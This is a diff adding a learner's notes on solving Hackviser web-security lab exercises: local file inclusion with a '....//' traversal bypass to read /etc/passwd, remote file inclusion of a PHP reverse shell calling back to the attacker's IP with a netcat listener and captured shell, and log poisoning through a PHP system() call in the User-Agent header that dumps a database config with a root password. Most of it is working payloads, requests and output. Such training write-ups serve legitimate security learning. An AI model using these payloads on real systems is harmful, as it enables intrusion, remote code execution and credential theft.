@@ -198,3 +198,120 @@ The content of the 404 error page you see in the web application is fetched from
 "/" and ".." are blocked to prevent LFI vulnerability. Find a way to bypass this restriction.
 
 What is the username of the last user added in /etc/passwd?
+
+*solved* ->
+#+begin_src php
+GET /index.php?page=....//....//....//....//etc/passwd HTTP/1.1
+Host: loved-scream.europe1.hackviser.space
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+#+end_src
+
+*bypass payload* ->
+: ....//....//....//....//etc/passwd
+
+* Basic remote file inclusion
+This lab contains a Remote File Inclusion (RFI) vulnerability that leads to remote code execution, allowing the attacker to run arbitrary code hosted on a remote server.
+
+The content of the 404 error page you see in the web application is fetched from the path in the "page" parameter in the URL. A file from a remote system can be included in the page by changing the "page" parameter.
+
+You should serve the payload on HackerBox or on your own computer using a VPN.
+
+What is the hostname of the server on which the website runs?
+
+O paramêtro ~?page~ é vulnerável pois o input do user não é sanitizado, permitindo uma manipulação de comandos e inputs no server, permitindo um Remote File Inlcusion.
+
+*payload criado na attackerbox* ->
+#+begin_src php shell.php
+<?php
+$ip = "172.20.45.144";
+$port = 4444;
+$sock = fsockopen($ip, $port);
+$proc = proc_open("/bin/sh -i", [
+    0 => $sock,
+    1 => $sock,
+    2 => $sock
+], $pipes);
+?>
+#+end_src
+
+*listening for param ?page* ->
+: python3 -m http.server 7777
+
+*at vuln parameter* ->
+: ?page=http://172.20.45.144:7777/shell.php
+
+*another tty to listening the reverse shell payload* ->
+: nc -lvp 4444
+
+*result* ->
+#+begin_src sh
+┌─[root@hackerbox]─[~]
+└──╼ #nc -lvp 4444
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.20.45.185.
+Ncat: Connection from 172.20.45.185:48744.
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+404.php
+assets
+index.php
+$ hostname
+imperial
+#+end_src
+
+* exam machine
+The ?page parameter is vuln to get files from system, and the user- agent header can execute commands to get sensitive date
+#+begin_src python
+GET /index.php?page=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
+Host: healthmateapp.hv
+User-Agent: <?php system('less config.php'); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+#+end_src
+
+#+begin_src python
+HTTP/1.1" 200 916 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
+172.20.45.144 - - [29/Sep/2025:14:57:09 -0400] "GET /index.php?page=home.php HTTP/1.1" 200 916 "-" "assets
+config.php
+guide.php
+home.php
+index.php
+"
+172.20.45.144 - - [29/Sep/2025:14:57:49 -0400] "GET /index.php?page=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1" 200 749 "-" "assets
+config.php
+guide.php
+home.php
+index.php
+"
+172.20.45.144 - - [29/Sep/2025:14:59:51 -0400] "GET /index.php?page=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1" 200 781 "-" "<?php
+    try{
+        $host = 'localhost';
+        $db_name = 'hv_database';
+        $charset = 'utf8';
+        $username = 'root';
+        $password = '6UabF6Ff7XJq8PMtA';
+    
+        $db = new PDO("mysql:host=$host;dbname=$db_name;charset=$charset",$username,$password);
+    } catch(PDOException $e){
+       
+    }
+#+end_src
